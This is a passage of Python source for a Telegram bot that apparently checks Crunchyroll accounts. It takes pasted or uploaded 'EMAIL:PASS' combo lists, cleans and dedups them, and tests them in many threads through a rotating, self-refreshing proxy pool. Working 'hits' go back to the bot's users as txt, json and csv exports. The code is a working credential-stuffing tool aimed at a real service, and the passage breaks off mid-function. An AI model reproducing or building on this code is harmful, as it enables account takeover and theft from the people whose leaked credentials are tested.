    stop_kb = _build_kb([[("🛑 Stop", "stopcheck", "danger"), ("⏸️ Pause", "pausecheck", "primary")]])
    note = await msg.reply_text(init_card, parse_mode=ParseMode.HTML, reply_markup=stop_kb)
    try:
        ACTIVE_CHECK_MSG[uid] = note.message_id
    except Exception:
        pass
    loop = asyncio.get_running_loop()
    reporter = ProgressReporter(note, loop, uid=uid)
    sent_hits = []
    def _hit_cb(entry):
        try:
            sent_hits.append(entry)
            fut = asyncio.run_coroutine_threadsafe(send_hit_cards(msg, [entry], cap=1), loop)
        except Exception:
            pass
    try:
        ensure_proxies()
    except Exception:
        pass
    async def _proxy_watchdog():
        last_processed = 0
        stuck_since = time.time()
        while True:
            await asyncio.sleep(45)
            try:
                cnt = proxy_count()
                if cnt < 15:
                    await asyncio.to_thread(refresh_live_proxies, True)
                if pool_size() > 0 and cnt < 10:
                    _load_pool_into_live()
                if cnt == 0:
                    await asyncio.to_thread(refresh_live_proxies, True)
                try:
                    cur = results.get("processed", 0) if 'results' in locals() else 0
                    if cur == last_processed:
                        if time.time() - stuck_since > 90:
                            logger.warning("Watchdog: stuck at %d for 90s — refreshing proxies", cur)
                            await asyncio.to_thread(refresh_live_proxies, True)
                            stuck_since = time.time()
                    else:
                        last_processed = cur
                        stuck_since = time.time()
                except Exception:
                    pass
            except Exception as e:
                logger.debug("watchdog err %s", e)
            try:
                if note.text and "SCAN COMPLETE" in note.text:
                    break
                if note.text and "STOPPED" in note.text:
                    break
                if STOP_REQUEST.get(uid):
                    break
            except Exception:
                break
        return
    wd_task = asyncio.create_task(_proxy_watchdog())
    try:
        results = await asyncio.to_thread(run_check, text, reporter, _hit_cb, uid)
    except Exception as e:
        with USER_LOCK:
            USER_LAST_CHECK.pop(f"busy_{uid}", None)
            STOP_REQUEST.pop(uid, None)
            PAUSE_REQUEST.pop(uid, None)
            ACTIVE_CHECK_MSG.pop(uid, None)
        await note.edit_text(f"❌ <b>Check error</b>\n━━━━━━━━━━━━━━━━━━━━━\n<code>{esc(str(e)[:120])}</code>",
                             parse_mode=ParseMode.HTML)
        return
    try:
        wd_task.cancel()
    except Exception:
        pass
    bump_checks(results["processed"])
    was_stopped = bool(results.get("stopped"))
    if was_stopped:
        try:
            await note.edit_text(
                f"🛑 <b>STOPPED</b> — Check cancelled by user\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"📊 Processed: <code>{results.get('processed',0)}/{results.get('total',0)}</code>\n"
                f"✅ Hits: <code>{len(results.get('hits',[]))}</code> | 🆓 Free: <code>{len(results.get('free',[]))}</code>\n"
                f"⏱ Time: <code>{results.get('seconds',0)}s</code> | 🌐 Live: <code>{proxy_count()}</code>",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass
        premium_only = STORE.get_premium_only(uid)
        to_send = results["hits"] if premium_only else results["hits"] + results["free"]
        if to_send:
            txt_path = make_export(to_send, "txt")
            json_path = make_export(to_send, "json")
            try:
                with open(txt_path, "rb") as f:
                    await msg.reply_document(document=InputFile(f, filename="accounts_stopped.txt"),
                                             caption=f"💎 Partial Accounts: {len(to_send)} (stopped)")
                with open(json_path, "rb") as f:
                    await msg.reply_document(document=InputFile(f, filename="accounts_stopped.json"),
                                             caption="📁 Partial JSON export")
            finally:
                Path(txt_path).unlink(missing_ok=True)
                Path(json_path).unlink(missing_ok=True)
        with USER_LOCK:
            USER_LAST_CHECK.pop(f"busy_{uid}", None)
            STOP_REQUEST.pop(uid, None)
            PAUSE_REQUEST.pop(uid, None)
            ACTIVE_CHECK_MSG.pop(uid, None)
        await reply_menu(msg, "🛑 <b>Check Stopped</b> — partial results above.",
                         [[("🔁 Check Again", "check", "success"), ("📂 Check File", "file", "primary")],
                          [("⬅️ Main Menu", "menu", "danger")]])
        return

    await note.edit_text(summary_text(results), parse_mode=ParseMode.HTML)
    premium_only = STORE.get_premium_only(uid)
    to_send = results["hits"] if premium_only else results["hits"] + results["free"]
    if to_send:
        txt_path = make_export(to_send, "txt")
        json_path = make_export(to_send, "json")
        csv_path = make_export(to_send, "csv")
        try:
            with open(txt_path, "rb") as f:
                await msg.reply_document(document=InputFile(f, filename="accounts.txt"),
                                         caption=f"💎 Accounts: {len(to_send)}")
            with open(json_path, "rb") as f:
                await msg.reply_document(document=InputFile(f, filename="accounts.json"),
                                         caption="📁 JSON export")
            with open(csv_path, "rb") as f:
                await msg.reply_document(document=InputFile(f, filename="accounts.csv"),
                                         caption="📊 CSV export")
        finally:
            Path(txt_path).unlink(missing_ok=True)
            Path(json_path).unlink(missing_ok=True)
            Path(csv_path).unlink(missing_ok=True)
    if results["hits"]:
        sent = await send_hit_cards(msg, results["hits"])
        extra = len(results["hits"]) - sent
        tail = f"\n<i>…+{extra} more in the export file</i>" if extra > 0 else ""
        rows = [[("🔁 Check Again", "check", "success"), ("📂 Check File", "file", "primary")],
                [("⬅️ Main Menu", "menu", "danger")]]
        with USER_LOCK:
            USER_LAST_CHECK.pop(f"busy_{uid}", None)
            STOP_REQUEST.pop(uid, None)
            PAUSE_REQUEST.pop(uid, None)
            ACTIVE_CHECK_MSG.pop(uid, None)
        await reply_menu(msg, f"📬 <b>Hit cards sent:</b> {sent} {tail}", rows)
    else:
        with USER_LOCK:
            USER_LAST_CHECK.pop(f"busy_{uid}", None)
            STOP_REQUEST.pop(uid, None)
            PAUSE_REQUEST.pop(uid, None)
            ACTIVE_CHECK_MSG.pop(uid, None)
        await reply_menu(msg, "😕 No hits this time.",
                         [[("🔁 Check Again", "check", "success"), ("📂 Check File", "file", "primary")],
                          [("⬅️ Main Menu", "menu", "danger")]])

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        msg = update.effective_message
        if not user or not msg:
            return
        uid = user.id
        if uid in BANNED_USERS:
            await reply_menu(msg, "🚫 <b>You are banned</b> from using this bot.", [[("⬅️ Back", "menu", "danger")]])
            return
        uname = getattr(user, "username", None)
        name = getattr(user, "first_name", None) or uname or str(uid)
        if not is_admin(uid, uname):
            owner_contact = f"<a href=\"https://t.me/{OWNER_USERNAME.lstrip('@')}\">{OWNER_USERNAME}</a> (<code>{OWNER_ID}</code>)" if OWNER_USERNAME and OWNER_USERNAME != "@unknown" and OWNER_USERNAME.lstrip("@") else f"<code>{OWNER_ID}</code>"
            owner_url = f"https://t.me/{OWNER_USERNAME.lstrip('@')}" if OWNER_USERNAME and OWNER_USERNAME != "@unknown" and OWNER_USERNAME.lstrip("@") else f"tg://user?id={OWNER_ID}"
            await reply_menu(msg, f"❌ <b>Access Denied</b>\n\nThis bot is <b>Owner + Admins only</b>.\nContact owner: {owner_contact}", [[("💬 Contact Owner", owner_url, "primary")]])
            return
        try:
            text = welcome_premium_text(uid, name)
            if is_owner(uid):
                text = "👑 <b>Welcome Owner!</b>\n" + "━━━━━━━━━━━━━━━━━━━━━\n" + text
            elif is_admin(uid, uname):
                text = "✅ <b>Welcome Admin!</b>\n" + "━━━━━━━━━━━━━━━━━━━━━\n" + text
        except Exception as e:
            logger.warning("welcome failed %s", e)
            try:
                text, _ = menu_main(uid, uname)
            except Exception:
                text = "╭────────────────────────╮\n│  🔥 <b>CRUNCHYROLL</b> 🔥  │\n╰────────────────────────╯"
            if is_owner(uid):
                text = "👑 <b>Welcome Owner!</b>\n\n" + text
        _, rows = menu_main(uid, uname)
        try:
            await reply_menu(msg, text, rows)
        except Exception as e:
            logger.warning("cmd_start inline send failed %s", e)
            try:
                await msg.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=_build_kb(rows))
            except Exception:
                pass
        try:
            rm = await msg.reply_text(" ", reply_markup=ReplyKeyboardRemove())
            try:
                await rm.delete()
            except Exception:
                pass
        except Exception:
            pass
        return
    except Exception as e:
        logger.error("cmd_start error: %s", e, exc_info=True)
        try:
            await update.effective_message.reply_text("⚠️ Start failed — try again.")
        except Exception:
            pass

async def cmd_any(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        msg = update.effective_message
        if not user or not msg:
            return
        uid = user.id
        if uid in BANNED_USERS and not is_owner(uid):
            await reply_menu(msg, "🚫 <b>You are banned</b>", [[("⬅️ Back", "menu", "danger")]])
            return
        txt = (msg.text or "").strip()
        txt_lower = txt.lower()

        if txt_lower in ("/cmds", "/commands", "/help"):
            await reply_menu(msg, help_text(), [[("⬅️ Back", "menu", "danger")]])
            return
        if txt_lower in ("/stop", "/cancel", "/stopcheck"):
            if not is_admin(user.id, getattr(user, "username", None)):
                await reply_menu(msg, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            busy = False
            with USER_LOCK:
                if USER_LAST_CHECK.get(f"busy_{user.id}"):
                    busy = True
                    STOP_REQUEST[user.id] = True
            if busy:
                await reply_menu(msg, "🛑 <b>Stopping...</b>\n<i>Current scan will stop in a moment</i>", [[("🛑 Stop Again", "stopcheck", "danger"), ("⬅️ Menu", "menu", "danger")]])
            else:
                await reply_menu(msg, "ℹ️ No active check running.", [[("⬅️ Back", "menu", "danger")]])
            return
        if txt_lower in ("/pause", "/pausecheck"):
            if not is_admin(uid, getattr(user, "username", None)):
                await reply_menu(msg, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            with USER_LOCK:
                if USER_LAST_CHECK.get(f"busy_{uid}"):
                    PAUSE_REQUEST[uid] = True
                    await reply_menu(msg, "⏸️ <b>Pausing...</b>\n<i>Check will pause after current batch</i>", [[("▶️ Resume", "resumecheck", "success"), ("🛑 Stop", "stopcheck", "danger")]])
                else:
                    await reply_menu(msg, "ℹ️ No active check to pause.", [[("⬅️ Back", "menu", "danger")]])
            return
        if txt_lower in ("/resume", "/resumecheck"):
            if not is_admin(uid, getattr(user, "username", None)):
                await reply_menu(msg, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            if PAUSE_REQUEST.get(uid):
                PAUSE_REQUEST.pop(uid, None)
                await reply_menu(msg, "▶️ <b>Resumed</b> — check continuing...", [[("🛑 Stop", "stopcheck", "danger")]])
            else:
                await reply_menu(msg, "ℹ️ No paused check.", [[("⬅️ Back", "menu", "danger")]])
            return
        if txt_lower in ("/proxy", "/proxies", "/proxyinfo", "/pool"):
            if not is_admin(user.id, getattr(user, "username", None)):
                await reply_menu(msg, "❌ <b>Admin Only</b>\nOnly owner/admins can use this bot.", [[("⬅️ Back", "menu", "danger")]])
                return
            ptext, rows = menu_owner()
            await reply_menu(msg, ptext, rows)
            return
        if txt_lower in ("/addproxy", "/addproxies", "/uploadproxy"):
            if not is_admin(user.id, getattr(user, "username", None)):
                await reply_menu(msg, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            set_pending(user.id, "addpx")
            await reply_menu(msg, "📥 <b>Upload Proxies</b>\n\nPaste <code>user:pass@ip:port</code> or <code>ip:port</code> lines, or send a <code>.txt</code> file, or send a URL that returns proxy list.\nAuto-detect + auto-check + scoring.", [[("⬅️ Back", "proxysettings", "danger")]])
            return
        if txt_lower in ("/clearproxy", "/clearproxies"):
            if not is_admin(user.id, getattr(user, "username", None)):
                await reply_menu(msg, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            await asyncio.to_thread(clear_pool)
            await reply_menu(msg, "🧹 <b>Proxies Cleared</b>\nPool & live reset.", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Menu", "menu", "danger")]])
            return
        if txt_lower in ("/clean", "/cleandup", "/dedup"):
            if not is_admin(uid, getattr(user, "username", None)):
                await reply_menu(msg, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            set_pending(uid, "clean")
            await reply_menu(msg, "🧹 <b>Clean Combos</b>\n\nSend your combo list — I'll dedup, clean, remove invalid.\n\nReturns cleaned file + stats.", [[("⬅️ Back", "menu", "danger")]])
            return
        if txt_lower in ("/stats", "/status", "/botstats"):
            await reply_menu(msg, status_text(), [[("📊 Proxy Stats", "proxystats", "primary"), ("📅 Daily", "dailystats", "primary")], [("⬅️ Back", "menu", "danger")]])
            return
        if txt_lower in ("/history", "/checkhistory"):
            if not is_admin(uid, getattr(user, "username", None)):
                await reply_menu(msg, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            hist = get_history(uid)
            if not hist:
                await reply_menu(msg, "📜 <b>No history yet</b>\n\nDo some checks first!", [[("⬅️ Back", "menu", "danger")]])
                return
            txt2 = "📜 <b>Last 5 Checks</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            for h in reversed(hist):
                t = h.get("time","")[:16].replace("T"," ")
                txt2 += f"• {t} — Total: <code>{h.get('total')}</code> Hits: <code>{h.get('hits')}</code> CPM: <code>{h.get('cpm')}</code> {h.get('seconds')}s\n"
            await reply_menu(msg, txt2, [[("⬅️ Back", "menu", "danger")]])
            return
        if txt_lower.startswith("/addadmin"):
            if not is_owner(user.id):
                await reply_menu(msg, "❌ <b>Owner Only</b> — only owner can add admins.", [[("⬅️ Back", "menu", "danger")]])
                return
            parts = txt.split()
            if len(parts) < 2 and msg.reply_to_message and msg.reply_to_message.from_user:
                target = msg.reply_to_message.from_user
                try:
                    ok = STORE.add_admin(target.id, getattr(target, "username", None))
                    await reply_menu(msg, f"{'✅ Added' if ok else 'ℹ️ Already'} admin: <code>{target.id}</code> @{getattr(target,'username','')}", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
                except Exception as e:
                    await reply_menu(msg, f"❌ Error: <code>{esc(str(e))}</code>", [[("⬅️ Back", "menu", "danger")]])
                return
            if len(parts) < 2:
                await reply_menu(msg, "👑 <b>Add Admin</b>\n\nUse: <code>/addadmin 123456789</code> or <code>/addadmin @username</code>\nOr reply to a user with /addadmin", [[("⬅️ Back", "menu", "danger")]])
                return
            arg = parts[1].lstrip("@")
            try:
                if arg.isdigit():
                    ok = STORE.add_admin(int(arg))
                    await reply_menu(msg, f"{'✅ Added' if ok else 'ℹ️ Already'} admin: <code>{arg}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
                else:
                    ok = STORE.add_admin(0, arg)
                    await reply_menu(msg, f"{'✅ Added' if ok else 'ℹ️ Already'} admin: @{arg}", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
            except Exception as e:
                await reply_menu(msg, f"❌ Error: <code>{esc(str(e))}</code>", [[("⬅️ Back", "menu", "danger")]])
            return
        if txt_lower.startswith("/removeadmin") or txt_lower.startswith("/deladmin"):
            if not is_owner(user.id):
                await reply_menu(msg, "❌ <b>Owner Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            parts = txt.split()
            if len(parts) < 2:
                await reply_menu(msg, "👑 <b>Remove Admin</b>\nUse: <code>/removeadmin 123456</code> or <code>/removeadmin @username</code>", [[("⬅️ Back", "menu", "danger")]])
                return
            arg = parts[1].lstrip("@")
            try:
                if arg.isdigit():
                    ok = STORE.remove_admin(int(arg))
                else:
                    ok = STORE.remove_admin(None, arg)
                await reply_menu(msg, f"{'✅ Removed' if ok else '❌ Not found'}: <code>{arg}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
            except Exception as e:
                await reply_menu(msg, f"❌ Error: <code>{esc(str(e))}</code>", [[("⬅️ Back", "menu", "danger")]])
            return
        if txt_lower.startswith("/ban"):
            if not is_owner(user.id):
                await reply_menu(msg, "❌ <b>Owner Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            parts = txt.split()
            if len(parts) < 2:
                await reply_menu(msg, "🚫 <b>Ban User</b>\nUse: <code>/ban 123456</code> or reply to user with /ban", [[("⬅️ Back", "menu", "danger")]])
                return
            try:
                ban_id = int(parts[1])
                BANNED_USERS.add(ban_id)
                save_banned(BANNED_USERS)
                await reply_menu(msg, f"🚫 Banned: <code>{ban_id}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
            except Exception as e:
                await reply_menu(msg, f"❌ Error: <code>{esc(str(e))}</code>", [[("⬅️ Back", "menu", "danger")]])
            return
        if txt_lower.startswith("/unban"):
            if not is_owner(user.id):
                await reply_menu(msg, "❌ <b>Owner Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            parts = txt.split()
            if len(parts) < 2:
                await reply_menu(msg, "✅ <b>Unban User</b>\nUse: <code>/unban 123456</code>", [[("⬅️ Back", "menu", "danger")]])
                return
            try:
                unban_id = int(parts[1])
                BANNED_USERS.discard(unban_id)
                save_banned(BANNED_USERS)
                await reply_menu(msg, f"✅ Unbanned: <code>{unban_id}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
            except Exception as e:
                await reply_menu(msg, f"❌ Error: <code>{esc(str(e))}</code>", [[("⬅️ Back", "menu", "danger")]])
            return
        if txt_lower.startswith("/broadcast") or txt_lower.startswith("/bc"):
            if not is_owner(user.id):
                await reply_menu(msg, "❌ <b>Owner Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            bcast_msg = txt.split(" ", 1)[1] if " " in txt else ""
            if not bcast_msg:
                set_pending(uid, "broadcast")
                await reply_menu(msg, "📢 <b>Broadcast</b>\n\nSend message to broadcast to all active users.", [[("⬅️ Back", "menu", "danger")]])
                return
            # broadcast
            try:
                count = 0
                users = list(STORE.users.keys()) if STORE else []
                for u in users:
                    try:
                        await context.bot.send_message(chat_id=int(u), text=f"📢 <b>Broadcast from Owner</b>\n\n{bcast_msg}", parse_mode=ParseMode.HTML)
                        count += 1
                        await asyncio.sleep(0.1)
                    except Exception:
                        continue
                await reply_menu(msg, f"📢 Broadcast sent to <code>{count}</code> users", [[("⬅️ Back", "menu", "danger")]])
            except Exception as e:
                await reply_menu(msg, f"❌ Broadcast error: <code>{esc(str(e))}</code>", [[("⬅️ Back", "menu", "danger")]])
            return
        if txt_lower in ("/admins", "/adminlist"):
            try:
                admins = STORE.get_admins() if STORE else []
                admins_u = STORE.get_setting("admin_usernames", []) if STORE else []
                txt2 = "👥 <b>Admins</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                txt2 += f"👑 Owner: <code>{OWNER_ID}</code> @{OWNER_USERNAME.lstrip('@')}\n"
                for a in admins:
                    txt2 += f"• <code>{a}</code>\n"
                for u in admins_u:
                    txt2 += f"• @{u}\n"
                if not admins and not admins_u:
                    txt2 += "<i>No extra admins</i>\n"
                txt2 += f"\n🚫 Banned: <code>{len(BANNED_USERS)}</code> users\n"
                txt2 += "\n<i>Owner can /addadmin or /removeadmin /ban</i>"
                await reply_menu(msg, txt2, [[("⬅️ Back", "menu", "danger")]])
            except Exception as e:
                logger.warning("admins list failed %s", e)
                await reply_menu(msg, f"❌ Error listing admins", [[("⬅️ Back", "menu", "danger")]])
            return
        if txt_lower in ("/threads", "/setthreads"):
            try:
                await reply_menu(msg, f"🧵 <b>Set Threads</b>\nCurrent: <code>{THREADS}</code> • Max {MAX_THREADS_USER}", [[("🧵 50", "threads_50", "primary"), ("🧵 100", "threads_100", "success")], [("🧵 200", "threads_200", "primary"), ("🧵 300", "threads_300", "success")], [("🧵 500", "threads_500", "success")], [("⬅️ Back", "proxysettings", "danger")]])
            except Exception as e:
                logger.warning("threads menu failed %s", e)
            return
        try:
            uname_tmp = getattr(user, "username", None)
            text_m, rows = menu_main(user.id, uname_tmp)
            await reply_menu(msg, "🔘 This bot is 100% button-driven — pick an option below 👇\n\n" + text_m, rows)
        except Exception as e:
            logger.warning("cmd_any fallback menu failed %s", e)
            try:
                await msg.reply_text("Use /start")
            except Exception:
                pass
    except Exception as e:
        logger.error("cmd_any error: %s", e, exc_info=True)
        try:
            if 'msg' in locals() and msg:
                await msg.reply_text("⚠️ Command error — try again.")
        except Exception:
            pass

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global THREADS
    try:
        user = update.effective_user
        msg = update.effective_message
        if not user or not msg or not msg.text:
            return
        uid = user.id
        if uid in BANNED_USERS and not is_owner(uid):
            await reply_menu(msg, "🚫 <b>You are banned</b>", [[("⬅️ Back", "menu", "danger")]])
            return
        uname_ht = getattr(user, "username", None)
        text = msg.text.strip()
        if not is_admin(uid, uname_ht):
            owner_contact2 = f"<a href=\"https://t.me/{OWNER_USERNAME.lstrip('@')}\">{OWNER_USERNAME}</a> (<code>{OWNER_ID}</code>)" if OWNER_USERNAME and OWNER_USERNAME != "@unknown" and OWNER_USERNAME.lstrip("@") else f"<code>{OWNER_ID}</code>"
            owner_url2 = f"https://t.me/{OWNER_USERNAME.lstrip('@')}" if OWNER_USERNAME and OWNER_USERNAME != "@unknown" and OWNER_USERNAME.lstrip("@") else f"tg://user?id={OWNER_ID}"
            await reply_menu(msg, f"❌ <b>Access Denied</b>\nOwner/Admins only.\nContact: {owner_contact2}", [[("💬 Contact Owner", owner_url2, "primary")]])
            return
        _compat_map = {
            "💎 Check Account": "check", "📂 Check File": "file",
            "📖 How To Use": "help", "📊 Bot Stats": "status",
            "⚙️ Proxy Settings": "proxysettings", "👑 Tools Panel": "proxysettings",
            "👑 Owner Panel": "proxysettings", "⬅️ Main Menu": "menu", "⬅️ Back": "proxysettings",
            "🔁 Check Again": "check", "🧹 Clean Combos": "cleancombos", "🛠️ Tools": "tools",
        }
        compat_action = _compat_map.get(text)
        if compat_action:
            clear_pending(uid)
            if compat_action == "menu":
                t2, rows2 = menu_main(uid, uname_ht)
                await reply_menu(msg, t2, rows2)
                return
            elif compat_action == "check":
                set_pending(uid, "creds")
                await reply_menu(msg, "💎 <b>Check Account</b>\n\nSend <code>EMAIL:PASS</code> — one or many lines.\nExample: <code>user@gmail.com:pass123</code>\n\n✨ Auto clean + dedup + retry enabled", [[("⬅️ Back", "menu", "danger")]])
                return
            elif compat_action == "file":
                await reply_menu(msg, "📂 <b>Check File</b>\n\nSend me your <code>.txt</code> / <code>.csv</code> file with combos.\n\nAuto clean + dedup + Unlimited ♾️", [[("⬅️ Back", "menu", "danger")]])
                return
            elif compat_action == "help":
                await reply_menu(msg, help_text(), [[("⬅️ Back", "menu", "danger")]])
                return
            elif compat_action == "status":
                await reply_menu(msg, status_text(), [[("⬅️ Back", "menu", "danger")]])
                return
            elif compat_action == "proxysettings":
                ptext, rows = menu_owner()
                await reply_menu(msg, ptext, rows)
                return
            elif compat_action == "cleancombos":
                set_pending(uid, "clean")
                await reply_menu(msg, "🧹 <b>Clean Combos</b>\n\nSend your combo list — I'll dedup, clean, remove invalid.", [[("⬅️ Back", "menu", "danger")]])
                return
            elif compat_action == "tools":
                ttext, trows = menu_tools()
                await reply_menu(msg, ttext, trows)
                return

        pending = get_pending(uid)

        if pending:
            kind = pending["kind"]

            if kind == "creds":
                clear_pending(uid)
                creds = extract_credentials(text)
                if not creds:
                    await reply_menu(msg,
                        "❌ No credentials found.\nFormat: <code>EMAIL:PASS</code>",
                        [[("🔁 Try Again", "check", "success"), ("⬅️ Menu", "menu", "danger")]])
                    return
                if len(creds) > MAX_PASTED_CREDS:
                    await msg.reply_text(f"⚠️ Large paste: <code>{len(creds)}</code> combos — unlimited ♾️ processing...", parse_mode=ParseMode.HTML)
                # unlimited - continue
                await _run_and_report(msg, uid, text)
                return

            if kind == "clean":
                clear_pending(uid)
                cleaned, stats = clean_combos(text)
                if not cleaned:
                    await reply_menu(msg, "❌ No valid combos after cleaning.", [[("⬅️ Back", "menu", "danger")]])
                    return
                # save cleaned file
                fd, path = tempfile.mkstemp(suffix=".txt", prefix="cleaned_")
                os.close(fd)
                Path(path).write_text(cleaned, encoding="utf-8")
                try:
                    with open(path, "rb") as f:
                        await msg.reply_document(document=InputFile(f, filename="cleaned_combos.txt"),
                                                 caption=f"🧹 Cleaned: {stats['cleaned']} | Dup: {stats['dup']} | Invalid: {stats['invalid']} | Empty: {stats['empty']}")
                finally:
                    Path(path).unlink(missing_ok=True)
                # ask if want to check now
                set_pending(uid, "clean_check")
                PENDING[uid]["cleaned_text"] = cleaned
                await reply_menu(msg, f"🧹 <b>Cleaned Stats</b>\nTotal: <code>{stats['total']}</code> → Clean: <code>{stats['cleaned']}</code>\nDup: <code>{stats['dup']}</code> Invalid: <code>{stats['invalid']}</code>\n\nCheck now?", [[("✅ Check Now", "checkcleaned", "success"), ("⬅️ Menu", "menu", "danger")]])
                return

            if kind == "clean_check":
                # shouldn't happen via text, but handle
                clear_pending(uid)

            if kind == "addpx":
                clear_pending(uid)
                # check if it's a URL
                if text.strip().startswith("http") and " " not in text.strip() and "\n" not in text.strip():
                    # single URL — fetch proxies from URL
                    await msg.reply_text("🌐 Fetching proxies from URL...")
                    fetched = await asyncio.to_thread(fetch_proxies_from_url, text.strip())
                    if not fetched:
                        await reply_menu(msg, "❌ No proxies found at URL or fetch failed.", [[("📥 Try Again", "addpx", "primary"), ("⬅️ Back", "proxysettings", "danger")]])
                        return
                    ac = bool(STORE.get_setting("auto_check", True))
                    added, invalid = await asyncio.to_thread(add_proxies_to_pool, fetched, ac)
                    await reply_menu(msg, f"🌐 <b>Proxies from URL</b>\n\nFetched: <code>{len(fetched)}</code> ➕ Added: <code>{added}</code> ⚠️ Invalid: <code>{invalid}</code>\n📦 Pool: <code>{pool_size()}</code> 🌐 Live: <code>{proxy_count()}</code>", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Menu", "menu", "danger")]])
                    return

                lines = [l for l in text.splitlines() if l.strip()]
                if not lines:
                    return
                if len(lines) > MAX_PASTED_PROXIES:
                    await reply_menu(msg, f"❌ Too many lines (max {MAX_PASTED_PROXIES}).",
                                     [[("📥 Try Again", "addpx", "primary"),
                                       ("⬅️ Back", "proxysettings", "danger")]])
                    return
                _creds_check = extract_credentials(text)
                if _creds_check:
                    await _run_and_report(msg, uid, text)
                    return
                ac = bool(STORE.get_setting("auto_check", True))
                added, invalid = await asyncio.to_thread(add_proxies_to_pool, lines, ac)
                await asyncio.sleep(1)
                status = f"🔎 Auto-checking {added} new... Live: <code>{proxy_count()}</code> • Pool: <code>{pool_size()}</code>" if ac else f"Added. Pool: <code>{pool_size()}</code>"
                await reply_menu(
                    msg,
                    f"📥 <b>Proxies Added</b>\n\n➕ <code>{added}</code> | ⚠️ <code>{invalid}</code> | Pool: <code>{pool_size()}</code> | 🌐 Live: <code>{proxy_count()}</code>\n\n{status}\n<i>Fake proxies will be filtered during check • Scoring enabled</i>",
                    [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Back", "proxysettings", "danger")]],
                )
                return

            if kind == "importurl":
                clear_pending(uid)
                url = text.strip()
                if not url.startswith("http"):
                    await reply_menu(msg, "❌ Invalid URL — must start with http(s)://", [[("⬅️ Back", "proxysettings", "danger")]])
                    return
                await msg.reply_text(f"🌐 Fetching from URL...\n<code>{esc(url[:80])}</code>", parse_mode=ParseMode.HTML)
                fetched = await asyncio.to_thread(fetch_proxies_from_url, url)
                if not fetched:
                    await reply_menu(msg, "❌ No proxies found or fetch failed.", [[("🌐 Try Again", "importurl", "primary"), ("⬅️ Back", "proxysettings", "danger")]])
                    return
                ac = bool(STORE.get_setting("auto_check", True))
                added, invalid = await asyncio.to_thread(add_proxies_to_pool, fetched, ac)
                await reply_menu(msg, f"🌐 <b>URL Import Done</b>\n\nFetched: <code>{len(fetched)}</code> ➕ Added: <code>{added}</code>\nPool: <code>{pool_size()}</code> Live: <code>{proxy_count()}</code>", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Menu", "menu", "danger")]])
                return

            if kind == "broadcast":
                clear_pending(uid)
                bcast_msg = text
                try:
                    count = 0
                    users = list(STORE.users.keys()) if STORE else []
                    # also include admin ids
                    all_ids = set(users)
                    all_ids.update([str(x) for x in ADMIN_IDS])
                    for u in all_ids:
                        try:
                            if int(u) in BANNED_USERS:
                                continue
                            await context.bot.send_message(chat_id=int(u), text=f"📢 <b>Broadcast</b>\n\n{bcast_msg}", parse_mode=ParseMode.HTML)
                            count += 1
                            await asyncio.sleep(0.08)
                        except Exception:
                            continue
                    await reply_menu(msg, f"📢 Broadcast sent to <code>{count}</code> users", [[("⬅️ Back", "menu", "danger")]])
                except Exception as e:
                    await reply_menu(msg, f"❌ Error: <code>{esc(str(e))}</code>", [[("⬅️ Back", "menu", "danger")]])
                return

            if kind == "addadmin":
                clear_pending(uid)
                if not is_owner(uid):
                    await reply_menu(msg, "❌ Owner only.", [[("⬅️ Back", "menu", "danger")]])
                    return
                arg = text.strip().lstrip("@")
                try:
                    if arg.isdigit():
                        ok = STORE.add_admin(int(arg))
                        await reply_menu(msg, f"{'✅ Added' if ok else 'ℹ️ Already'} admin: <code>{arg}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
                    else:
                        ok = STORE.add_admin(0, arg)
                        await reply_menu(msg, f"{'✅ Added' if ok else 'ℹ️ Already'} admin: @{arg}", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
                except Exception as e:
                    await reply_menu(msg, f"❌ Error: <code>{esc(str(e))}</code>", [[("⬅️ Back", "admins", "danger")]])
                return
            if kind == "remadmin":
                clear_pending(uid)
                if not is_owner(uid):
                    await reply_menu(msg, "❌ Owner only.", [[("⬅️ Back", "menu", "danger")]])
                    return
                arg = text.strip().lstrip("@")
                try:
                    if arg.isdigit():
                        ok = STORE.remove_admin(int(arg))
                    else:
                        ok = STORE.remove_admin(None, arg)
                    await reply_menu(msg, f"{'✅ Removed' if ok else '❌ Not found'}: <code>{arg}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
                except Exception as e:
                    await reply_menu(msg, f"❌ Error: <code>{esc(str(e))}</code>", [[("⬅️ Back", "admins", "danger")]])
                return

            if kind == "banuser":
                clear_pending(uid)
                if not is_owner(uid):
